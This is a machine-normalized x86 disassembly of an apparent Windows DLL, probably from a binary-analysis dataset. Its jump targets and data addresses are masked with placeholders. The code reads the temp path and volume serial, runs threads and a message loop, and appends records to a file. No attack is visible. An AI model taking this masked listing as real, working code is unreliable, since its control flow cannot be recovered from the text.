init
push ebp
mov ebp esp
sub esp 0x22c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
lea eax [ ebp - 0x20c ]
push eax
push 0x104
call [ GetTempPathW@IAT ]
lea ecx [ ebp - 0x210 ]
push ecx
push 0x0
lea edx [ ebp - 0x20c ]
push edx
push sub_100010c0
push 0x0
push 0x0
call [ CreateThread@IAT ]
mov esi [ GetMessageW@IAT ]
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x22c ]
push eax
call esi
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov al 0x1
pop esi
call sub_10008bf6
mov esp ebp
pop ebp
retn
push ebx
mov ebx [ DispatchMessageW@IAT ]
push edi
mov edi [ TranslateMessage@IAT ]
lea esp [ esp ]
lea ecx [ ebp - 0x22c ]
push ecx
call edi
lea edx [ ebp - 0x22c ]
push edx
call ebx
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x22c ]
push eax
call esi
test eax eax
jne r-xdata
pop edi
pop ebx
sub_100010c0
push ebp
mov ebp esp
push 0xffffffff
push sub_10011e04
mov eax [ fs : 0x0 ]
push eax
sub esp 0x5c
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
xor edi edi
mov [ ebp - 0x68 ] r--data
mov [ ebp - 0x64 ] edi
mov [ ebp - 0x60 ] edi
mov [ ebp - 0x5c ] edi
mov [ ebp - 0x4 ] edi
push 0x8
mov [ ebp - 0x4c ] edi
call sub_10008d9c
add esp 0x4
cmp eax edi
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x14 ] edi
call sub_10008c8d
push r--data
lea ecx [ ebp - 0x24 ]
push ecx
mov [ ebp - 0x24 ] r--data
call sub_10009ef4
int3
mov [ ebp - 0x4c ] eax
xor ecx ecx
mov [ eax ] ecx
xor edx edx
mov [ eax + 0x4 ] edx
mov ecx [ ebp - 0x4c ]
lea eax [ ebp - 0x4c ]
mov [ ecx ] eax
mov [ ebp - 0x48 ] edi
mov [ ebp - 0x44 ] edi
mov [ ebp - 0x40 ] edi
mov [ ebp - 0x3c ] edi
mov [ ebp - 0x4 ] 0x1
mov edx [ ebp + 0x8 ]
push edx
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0x34 ] edi
call sub_10001440
push 0x5c
mov [ ebp - 0x4 ] 0x2
call sub_10008d9c
add esp 0x4
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] 0x3
cmp eax edi
je r-xdata
mov [ ebp + 0x8 ] edi
mov esi eax
call sub_10005ef0
mov [ ebp + 0x8 ] eax
jmp r-xdata
push 0x68
call sub_10008d9c
add esp 0x4
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x4 ] 0x4
cmp eax edi
je r-xdata
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
mov [ ebp - 0x4 ] 0x2
mov eax [ ebp - 0x54 ]
cmp eax edi
je r-xdata
xor ebx ebx
push eax
call sub_10003960
mov ebx eax
jmp r-xdata
xor esi esi
push eax
call sub_10007540
mov esi eax
jmp r-xdata
push ebx
lea eax [ ebp - 0x68 ]
mov [ ebp - 0x4 ] 0x2
call sub_10001630
push 0x5c
call sub_10008d9c
add esp 0x4
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x4 ] 0x5
cmp eax edi
je r-xdata
push edi
lea eax [ ebp - 0x68 ]
mov [ ebp - 0x4 ] 0x2
call sub_10001630
lea eax [ ebp - 0x68 ]
mov [ ebp - 0x4 ] 0x7
call sub_10001cd0
mov edx [ ebp + 0x8 ]
push edx
call sub_10008d40
push ebx
call sub_10008d40
push esi
call sub_10008d40
push edi
call sub_10008d40
add esp 0x10
lea ebx [ ebp - 0x68 ]
call sub_100013b0
mov al 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push eax
call sub_100050a0
mov edi eax
push esi
lea eax [ ebp - 0x68 ]
mov [ ebp - 0x4 ] 0x2
call sub_10001630
push 0x40
call sub_10008d9c
add esp 0x4
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x4 ] 0x6
cmp eax edi
je r-xdata
sub_100012c0
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10008ce9
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10008d40
add esp 0x4
sub_100012f0
push ebp
mov ebp esp
push 0xffffffff
push sub_100119f0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x0
mov eax [ ecx ]
mov edx [ eax + 0x10 ]
call edx
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_100013b0
push edi
mov edi [ ebx + 0x14 ]
mov [ ebx ] r--data
test edi edi
je r-xdata
push esi
mov esi [ ebx + 0x18 ]
test esi esi
je r-xdata
call sub_100028e0
push edi
call sub_10008d40
add esp 0x4
lea esi [ ebx + 0x1c ]
call sub_10001f40
mov ecx [ esi ]
push ecx
call sub_10008d40
xor edi edi
mov [ esi ] edi
mov eax [ ebx + 0x4 ]
add esp 0x4
pop esi
cmp eax edi
je r-xdata
cmp [ esi + 0x18 ] 0x10
jb r-xdata
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] edi
mov [ ebx + 0xc ] edi
pop edi
retn
push eax
call sub_10008d40
add esp 0x4
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] 0x0
push esi
mov [ esi + 0x4 ] 0x0
call sub_10008d40
add esp 0x4
mov eax [ esi + 0x4 ]
push eax
call sub_10008d40
add esp 0x4
sub_10001440
push ebp
mov ebp esp
push 0xffffffff
push sub_10011bae
mov eax [ fs : 0x0 ]
push eax
sub esp 0x21c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
push 0x24
mov edi ecx
mov [ ebp - 0x21c ] eax
call sub_10008d9c
xor ebx ebx
add esp 0x4
cmp eax ebx
je r-xdata
xor eax eax
mov [ eax + 0x18 ] 0xf
mov [ eax + 0x14 ] ebx
mov [ eax + 0x4 ] bl
jmp r-xdata
xor eax eax
mov edx [ ebp - 0x21c ]
push edx
push eax
call sub_100026f0
jmp r-xdata
mov [ edi + 0x18 ] eax
mov ecx 0x1
mov [ eax ] cx
mov ecx [ edi + 0x18 ]
add ecx 0x4
mov esi 0xb
mov eax r--data
call sub_10002000
mov edx [ edi + 0x18 ]
mov [ edx + 0x20 ] bl
mov eax [ edi + 0x18 ]
push 0x206
lea edx [ ebp - 0x216 ]
xor ecx ecx
push ebx
push edx
mov [ eax + 0x21 ] 0x1
mov [ ebp - 0x218 ] cx
call sub_1000a740
add esp 0xc
push ebx
push ebx
lea eax [ ebp - 0x228 ]
push eax
lea ecx [ ebp - 0x224 ]
push ecx
lea edx [ ebp - 0x220 ]
push edx
push 0x208
lea eax [ ebp - 0x218 ]
push eax
push ebx
call [ GetVolumeInformationW@IAT ]
mov ecx [ ebp - 0x220 ]
push 0x5c
mov [ edi + 0x34 ] ecx
call sub_10008d9c
add esp 0x4
mov [ ebp - 0x224 ] eax
mov [ ebp - 0x4 ] ebx
cmp eax ebx
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10008bf6
mov esp ebp
pop ebp
retn 0x4
cmp eax ecx
je r-xdata
lea esi [ edi + 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
mov [ edi + 0x14 ] eax
mov [ ebp - 0x21c ] edi
mov edi [ esi ]
lea eax [ ebp - 0x21c ]
push eax
sub edi edi
mov eax esi
sar edi 0x2
call sub_100024f0
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
lea eax [ ecx - 0x4 ]
lea edx [ edx + edi * 4 ]
cmp edx eax
je r-xdata
push ecx
push edx
call sub_10002560
add esp 0x8
sub_100015b0
push ebp
mov ebp esp
sub esp 0x218
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
xor eax eax
push 0x206
push eax
lea ecx [ ebp - 0x20a ]
push ecx
mov [ ebp - 0x20c ] ax
call sub_1000a740
add esp 0xc
push 0x0
push 0x0
lea edx [ ebp - 0x214 ]
push edx
lea eax [ ebp - 0x218 ]
push eax
lea ecx [ ebp - 0x210 ]
push ecx
push 0x208
lea edx [ ebp - 0x20c ]
push edx
push 0x0
call [ GetVolumeInformationW@IAT ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x210 ]
xor ecx ebp
mov [ esi + 0x34 ] eax
call sub_10008bf6
mov esp ebp
pop ebp
retn
sub_10001630
push ebp
mov ebp esp
push esi
mov esi eax
mov eax [ esi + 0x8 ]
lea ecx [ ebp + 0x8 ]
cmp ecx eax
jae r-xdata
cmp eax [ esi + 0xc ]
jne r-xdata
mov ecx [ esi + 0x4 ]
lea edx [ ebp + 0x8 ]
cmp ecx edx
ja r-xdata
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
lea eax [ esi + 0x4 ]
call sub_10001fb0
push edi
mov edi edx
sub edi ecx
sar edi 0x2
cmp eax [ esi + 0xc ]
jne r-xdata
add [ esi + 0x8 ] 0x4
pop esi
pop ebp
retn 0x4
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
lea eax [ esi + 0x4 ]
call sub_10001fb0
add [ esi + 0x8 ] 0x4
pop edi
pop esi
pop ebp
retn 0x4
mov ecx [ esi + 0x4 ]
mov edx [ ecx + edi * 4 ]
mov [ eax ] edx
sub_100016a0
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
push ebx
push esi
test eax eax
je r-xdata
pop esi
xor al al
pop ebx
mov esp ebp
pop ebp
retn 0x4
movzx eax [ eax ]
mov ecx 0xffff
cmp ax cx
je r-xdata
mov esi [ edi + 0x8 ]
sub esi [ edi + 0x4 ]
xor bl bl
sar esi 0x2
mov [ ebp - 0x4 ] eax
test esi esi
jle r-xdata
xor eax eax
mov edi edi
mov eax [ edi + 0x4 ]
movzx edx bl
mov ecx [ eax + edx * 4 ]
mov edx [ ecx ]
mov eax [ ebp + 0x8 ]
mov edx [ edx ]
push eax
call edx
pop esi
mov al 0x1
pop ebx
mov esp ebp
pop ebp
retn 0x4
inc bl
movzx eax bl
cmp eax esi
jl r-xdata
mov ecx [ edi + 0x4 ]
mov eax [ ecx + eax * 4 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0xc ]
call eax
movzx ecx ax
cmp ecx [ ebp - 0x4 ]
je r-xdata
sub_10001720
push ebp
mov ebp esp
push 0xffffffff
push sub_10011a4b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1c
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov esi [ ebx + 0x8 ]
sub esi [ ebx + 0x4 ]
sar esi 0x2
lea eax [ esi + esi * 2 ]
push eax
push 0x1
mov [ ebp - 0x18 ] eax
call sub_100091bb
add esp 0x8
mov [ ebp - 0x14 ] eax
mov edi eax
mov [ ebp - 0xd ] 0x0
test esi esi
jle r-xdata
push 0x10
call sub_10008d9c
mov esi eax
add esp 0x4
mov [ ebp - 0x1c ] esi
xor eax eax
mov [ ebp - 0x4 ] eax
cmp esi eax
je r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
mov edx [ ebx ]
mov eax [ edx + 0xc ]
mov ecx ebx
call eax
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x18 ]
mov [ esi ] ax
mov [ esi + 0x2 ] 0x0
mov [ esi + 0x4 ] 0xd
mov [ esi + 0x8 ] ecx
mov [ esi + 0xc ] edx
mov [ ebp - 0x14 ] esi
jmp r-xdata
mov ecx [ ebx + 0x4 ]
mov eax [ ecx + eax * 4 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0xc ]
call eax
mov [ edi ] ax
mov al [ ebp - 0xd ]
inc al
mov [ ebp - 0xd ] al
movzx eax al
mov [ edi + 0x2 ] 0x23
add edi 0x3
cmp eax esi
jl r-xdata
mov esi [ ebx + 0xc ]
add esi [ ebx + 0x10 ]
mov eax [ ebx + 0x8 ]
mov edi esi
shr edi 0x2
cmp eax edi
ja r-xdata
add eax 0x4
shr eax 0x2
cmp [ ebx + 0x8 ] eax
ja r-xdata
add ebx 0x1c
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebx + 0x10 ]
mov ecx [ ebx + 0xc ]
add ecx eax
test cl 0x3
jne r-xdata
mov edx [ ebx + 0x4 ]
cmp [ edx + edi * 4 ] 0x0
jne r-xdata
sub edi eax
call sub_10005700
mov ecx [ ebx + 0x4 ]
mov edx [ ecx + edi * 4 ]
and esi 0x3
lea esi [ edx + esi * 4 ]
test esi esi
je r-xdata
push 0x10
call sub_10008d9c
add esp 0x4
test eax eax
je r-xdata
inc [ ebx + 0x10 ]
mov al 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x14 ]
mov [ esi ] eax
lea edx [ ebp - 0x18 ]
push edx
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x18 ] 0x0
call sub_10008c8d
push r--data
lea eax [ ebp - 0x28 ]
push eax
mov [ ebp - 0x28 ] r--data
call sub_10009ef4
int3
mov ecx [ ebx + 0x4 ]
mov [ ecx + edi * 4 ] eax
sub_10001890
push ebp
mov ebp esp
push 0xffffffff
push sub_10011a1b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1c
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx [ ebp + 0x8 ]
mov esi [ ebx + 0x8 ]
sub esi [ ebx + 0x4 ]
xor edi edi
sar esi 0x2
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x14 ] edi
mov [ ebp - 0xd ] 0x0
test esi esi
jle r-xdata
xor al al
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov al [ ebp - 0xd ]
inc al
mov [ ebp - 0xd ] al
movzx eax al
cmp eax esi
jl r-xdata
mov eax [ eax + 0x14 ]
lea ecx [ edi + eax + 0x7 ]
mov [ ebp - 0x14 ] ecx
mov edi ecx
mov ecx [ ebx + 0x4 ]
mov ecx [ ecx + eax * 4 ]
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
call eax
test eax eax
je r-xdata
test edi edi
jne r-xdata
push edi
push 0x1
call sub_100091bb
add esp 0x8
mov [ ebp - 0x18 ] eax
test eax eax
je r-xdata
mov esi eax
mov [ ebp - 0xd ] 0x0
xor eax eax
mov al [ ebp - 0xd ]
inc al
mov [ ebp - 0xd ] al
movzx eax al
cmp eax [ ebp - 0x1c ]
jl r-xdata
mov eax [ ebp - 0x14 ]
add eax [ ebp - 0x18 ]
cmp esi eax
jae r-xdata
mov edx [ ebx + 0x4 ]
mov ecx [ edx + eax * 4 ]
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
call edx
mov edi eax
test edi edi
je r-xdata
push 0x10
call sub_10008d9c
mov esi eax
add esp 0x4
mov [ ebp + 0x8 ] esi
xor eax eax
mov [ ebp - 0x4 ] eax
cmp esi eax
je r-xdata
mov dx [ edi ]
mov [ esi ] dx
mov [ esi + 0x2 ] 0x24
mov ebx [ edi + 0x14 ]
lea eax [ edi + 0x4 ]
add esi 0x3
cmp [ eax + 0x14 ] 0x10
jb r-xdata
mov [ ebp + 0x8 ] eax
mov edx [ ebx ]
mov eax [ edx + 0xc ]
mov ecx ebx
call eax
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
mov [ esi ] ax
mov [ esi + 0x2 ] 0x1
mov [ esi + 0x4 ] 0xd
mov [ esi + 0x8 ] ecx
mov [ esi + 0xc ] edx
mov [ ebp + 0x8 ] esi
jmp r-xdata
push ebx
push eax
push ebx
push esi
call sub_10009225
add esi ebx
mov ebx [ ebp + 0x8 ]
mov [ esi ] 0x24
mov al [ edi + 0x20 ]
mov [ esi + 0x1 ] al
mov cl [ edi + 0x21 ]
mov [ esi + 0x2 ] cl
add esp 0x10
mov [ esi + 0x3 ] 0x23
add esi 0x4
mov eax [ eax ]
mov esi [ ebx + 0xc ]
add esi [ ebx + 0x10 ]
mov eax [ ebx + 0x8 ]
mov edi esi
shr edi 0x2
cmp eax edi
ja r-xdata
add eax 0x4
shr eax 0x2
cmp [ ebx + 0x8 ] eax
ja r-xdata
add ebx 0x1c
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebx + 0x10 ]
mov ecx [ ebx + 0xc ]
add ecx eax
test cl 0x3
jne r-xdata
mov edx [ ebx + 0x4 ]
cmp [ edx + edi * 4 ] 0x0
jne r-xdata
sub edi eax
call sub_10005700
mov ecx [ ebx + 0x4 ]
mov edx [ ecx + edi * 4 ]
and esi 0x3
lea esi [ edx + esi * 4 ]
test esi esi
je r-xdata
push 0x10
call sub_10008d9c
add esp 0x4
test eax eax
je r-xdata
inc [ ebx + 0x10 ]
mov al 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
mov [ esi ] eax
lea edx [ ebp - 0x1c ]
push edx
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x1c ] 0x0
call sub_10008c8d
push r--data
lea eax [ ebp - 0x28 ]
push eax
mov [ ebp - 0x28 ] r--data
call sub_10009ef4
int3
mov ecx [ ebx + 0x4 ]
mov [ ecx + edi * 4 ] eax
sub_10001aa0
push ebp
mov ebp esp
push 0xffffffff
push sub_10011cb0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x2c
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi ecx
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x4 ] 0x0
call sub_10001720
lea esp [ esp ]
mov edx [ ecx ]
mov eax [ edx ]
call eax
test eax eax
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x20 ] r--data
call sub_10008c8d
push r--data
lea ecx [ ebp - 0x2c ]
push ecx
call sub_10009ef4
mov [ ebp - 0x11 ] 0x0
mov ebx eax
call sub_100029e0
mov esi eax
test esi esi
je r-xdata
push 0x64
call [ Sleep@IAT ]
jmp r-xdata
mov ecx [ eax + ebx * 4 ]
mov eax [ ecx ]
mov edx [ eax + 0x4 ]
call edx
mov esi eax
test esi esi
je r-xdata
mov ecx 0xffff
cmp [ esi ] cx
je r-xdata
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
test ecx ecx
jne r-xdata
inc [ ebp - 0x11 ]
jmp r-xdata
movzx eax [ esi ]
mov ecx 0xffff
cmp ax cx
je r-xdata
push esi
call sub_100016a0
test al al
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx [ edi + 0x8 ]
movzx ebx [ ebp - 0x11 ]
sub edx eax
sar edx 0x2
cmp ebx edx
jae r-xdata
mov edx [ edi + 0x4 ]
mov ecx [ edx + ebx * 4 ]
mov ebx eax
mov eax [ ecx ]
mov edx [ eax + 0xc ]
call edx
movzx eax ax
cmp ax bx
je r-xdata
mov edi [ ebp - 0x18 ]
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
cmp [ esi + 0x4 ] 0xd
mov eax [ edi + 0x14 ]
jne r-xdata
push esi
call sub_100016a0
test al al
jne r-xdata
push esi
call sub_10008d40
add esp 0x4
push eax
call sub_10009181
add esp 0x4
mov edi [ eax + 0x38 ]
mov edi [ eax + 0x3c ]
jmp r-xdata
mov edi [ ebp - 0x18 ]
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
test ebx ebx
je r-xdata
push 0x2
push 0x0
push 0x0
push esi
mov [ ebp - 0x1c ] 0x0
call [ SetFilePointer@IAT ]
mov eax [ ebx + 0x4 ]
mov edi [ WriteFile@IAT ]
push 0x0
lea ecx [ ebp - 0x1c ]
push ecx
push 0x4
lea edx [ ebp - 0x20 ]
push edx
push esi
mov [ ebp - 0x20 ] eax
call edi
mov ecx [ ebp - 0x20 ]
mov edx [ ebx ]
push 0x0
lea eax [ ebp - 0x1c ]
push eax
push ecx
push edx
push esi
call edi
push esi
call [ CloseHandle@IAT ]
push eax
call sub_10002b20
push 0x0
push 0x2
push 0x4
push 0x0
push 0x0
push 0xc0000000
push edi
mov ebx eax
call [ CreateFileW@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
push esi
call sub_10008d40
mov edi [ ebp - 0x18 ]
add esp 0x4
inc [ ebp - 0x11 ]
jmp r-xdata
push eax
call sub_10009181
add esp 0x4
mov eax [ ebx ]
test eax eax
je r-xdata
push ebx
call sub_10008d40
add esp 0x4
push eax
call sub_10009181
add esp 0x4
sub_10001cd0
push ebp
mov ebp esp
sub esp 0x28
push ebx
push esi
mov esi eax
xor ebx ebx
push edi
cmp [ esi + 0x14 ] ebx
jne r-xdata
cmp [ esi + 0x34 ] ebx
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0xc ] r--data
call sub_10008c8d
push r--data
lea ecx [ ebp - 0x28 ]
push ecx
call sub_10009ef4
mov edx [ esi + 0x14 ]
mov eax [ esi + 0x34 ]
mov [ edx + 0x58 ] eax
mov edi [ esi + 0x8 ]
sub edi [ esi + 0x4 ]
xor ecx ecx
sar edi 0x2
mov eax edi
mov edx 0x4
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_10008b68
mov [ ebp - 0x8 ] eax
xor ecx ecx
mov eax edi
mov edx 0x4
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_10008b68
mov ecx [ esi + 0x14 ]
add esp 0x8
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push eax
push ebx
push ecx
push sub_10001370
push ebx
push ebx
mov [ ebp - 0x10 ] ebx
call [ CreateThread@IAT ]
mov [ ebp - 0xc ] eax
test edi edi
jle r-xdata
call sub_100015b0
mov ebx [ ebp - 0x8 ]
mov ecx [ ebx ]
mov edx [ ebp - 0xc ]
push 0xffffffff
push 0x0
lea eax [ ebp - 0x1c ]
push eax
push 0x2
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] edx
call [ WaitForMultipleObjects@IAT ]
xor esi esi
test edi edi
jle r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x14 ]
sub ecx eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x14 ] ecx
jmp r-xdata
mov edx [ ebp - 0xc ]
push edx
call [ CloseHandle@IAT ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebx + esi * 4 ]
push ecx
call [ CloseHandle@IAT ]
inc esi
cmp esi edi
jl r-xdata
add ecx [ ebp - 0x4 ]
mov edx [ esi + 0x4 ]
push ecx
lea eax [ edx + ebx * 4 ]
mov eax [ eax ]
push 0x0
push eax
push sub_100012f0
push 0x0
push 0x0
call [ CreateThread@IAT ]
mov ecx [ ebp - 0x4 ]
mov [ ecx ] eax
inc ebx
add ecx 0x4
mov [ ebp - 0x4 ] ecx
cmp ebx edi
jl r-xdata
mov ecx [ ebp - 0x14 ]
sub_10001e10
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
movzx eax [ esi + 0x2 ]
dec eax
je r-xdata
push ecx
call sub_10001890
sub eax 0x10
je r-xdata
push esi
call sub_10008d40
add esp 0x4
mov al 0x1
pop esi
pop ebp
retn 0x4
push eax
call sub_10009181
add esp 0x4
call sub_10001720
jmp r-xdata
sub eax 0x22
jne r-xdata
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
cmp [ esi + 0xc ] 0x4
jne r-xdata
mov ecx [ ecx + 0x14 ]
mov ecx [ ecx ]
mov edx [ esi + 0x8 ]
mov eax [ ecx ]
mov edx [ edx ]
mov eax [ eax + 0xc ]
push edx
call eax
jmp r-xdata
sub_10001e70
push ebp
mov ebp esp
xor eax eax
sub esp 0xc
cmp [ ecx + 0x2c ] eax
je r-xdata
mov esp ebp
pop ebp
retn
push esi
lea esi [ ecx + 0x1c ]
lea eax [ ebp - 0xc ]
mov ecx esi
call sub_100056e0
mov ecx [ eax ]
test ecx ecx
jne r-xdata
mov edx [ ecx ]
xor edx edx
jmp r-xdata
mov edx [ edx + 0x4 ]
mov eax [ edx + eax * 4 ]
mov eax [ eax + ecx * 4 ]
mov ecx [ esi + 0x10 ]
test ecx ecx
je r-xdata
sub eax edi
mov ecx [ eax + 0x8 ]
mov eax ecx
push edi
mov edi [ edx + 0x8 ]
shr eax 0x2
and ecx 0x3
cmp edi eax
ja r-xdata
pop edi
pop esi
mov edi [ esi + 0x8 ]
inc [ esi + 0xc ]
add edi edi
add edi edi
cmp edi [ esi + 0xc ]
ja r-xdata
dec ecx
mov [ esi + 0x10 ] ecx
jne r-xdata
mov [ esi + 0xc ] 0x0
mov [ esi + 0xc ] 0x0
sub_10001f40
mov eax [ esi + 0x10 ]
push ebx
xor ebx ebx
cmp eax ebx
je r-xdata
push edi
mov edi [ esi + 0x8 ]
cmp edi ebx
jbe r-xdata
lea ebx [ ebx ]
mov eax [ esi + 0x4 ]
pop edi
cmp eax ebx
je r-xdata
lea ebx [ ebx ]
cmp [ esi + 0x10 ] ebx
jne r-xdata
dec eax
mov [ esi + 0x10 ] eax
jne r-xdata
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
pop ebx
retn
push eax
call sub_10008d40
add esp 0x4
cmp edi ebx
ja r-xdata
mov ecx [ eax ]
push ecx
call sub_10008d40
add esp 0x4
cmp eax ebx
je r-xdata
mov [ esi + 0xc ] ebx
mov eax [ esi + 0x4 ]
dec edi
cmp [ eax + edi * 4 ] ebx
lea eax [ eax + edi * 4 ]
je r-xdata
sub_10001fb0
push esi
mov esi eax
mov edx [ esi ]
mov eax [ esi + 0x4 ]
sub eax edx
sar eax 0x2
cmp eax 0x3ffffffe
jbe r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edx
inc eax
sar ecx 0x2
cmp eax ecx
jbe r-xdata
push r--data
call sub_10008aad
pop esi
retn
push edi
mov edx ecx
shr edx 0x1
mov edi 0x3fffffff
sub edi edx
cmp edi ecx
pop edi
jae r-xdata
add ecx edx
xor ecx ecx
jmp r-xdata
push ecx
call sub_100020d0
mov ecx eax
cmp ecx eax
jae r-xdata
sub_10002000
push ebx
mov ebx eax
push edi
mov edi ecx
test ebx ebx
je r-xdata
cmp esi 0xfffffffe
jbe r-xdata
mov ecx [ edi + 0x14 ]
cmp ecx 0x10
jb r-xdata
mov eax [ edi + 0x14 ]
cmp eax esi
jae r-xdata
push r--data
call sub_10008aad
mov eax edi
mov eax [ edi ]
jmp r-xdata
test esi esi
jne r-xdata
mov eax [ edi + 0x10 ]
push eax
push esi
push edi
call sub_10002310
test esi esi
je r-xdata
cmp ecx 0x10
jb r-xdata
cmp ebx eax
jb r-xdata
cmp [ edi + 0x14 ] 0x10
jb r-xdata
mov [ edi + 0x10 ] esi
cmp eax 0x10
jb r-xdata
mov eax edi
pop edi
pop ebx
retn
mov eax edi
mov eax [ edi ]
jmp r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
mov eax edi
pop edi
mov [ eax ] 0x0
pop ebx
retn
mov eax [ edi ]
mov [ eax ] 0x0
mov eax edi
pop edi
pop ebx
retn
cmp ecx 0x10
jb r-xdata
mov edx [ edi + 0x10 ]
add edx eax
cmp edx ebx
jbe r-xdata
mov eax edi
mov [ eax + esi ] 0x0
mov eax [ edi ]
mov [ eax + esi ] 0x0
mov eax edi
pop edi
pop ebx
retn
push esi
push ebx
push eax
call sub_1000a7c0
add esp 0xc
cmp [ edi + 0x14 ] 0x10
mov [ edi + 0x10 ] esi
jb r-xdata
mov eax edi
sub ebx eax
push edi
mov ecx esi
call sub_10002150
pop edi
pop ebx
retn
mov eax [ edi ]
sub ebx eax
push edi
mov ecx esi
call sub_10002150
pop edi
pop ebx
retn
sub_100020d0
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
cmp ecx 0x3fffffff
jbe r-xdata
mov eax [ esi + 0x8 ]
sub eax [ esi ]
sar eax 0x2
cmp eax ecx
jae r-xdata
push r--data
call sub_10008aad
pop ebp
retn 0x4
push ebx
push edi
call sub_10002240
mov ecx [ esi + 0x4 ]
mov ebx eax
mov eax [ esi ]
sub ecx eax
sar ecx 0x2
add ecx ecx
add ecx ecx
push ecx
push eax
push ebx
call sub_10008e20
mov eax [ esi ]
mov edi [ esi + 0x4 ]
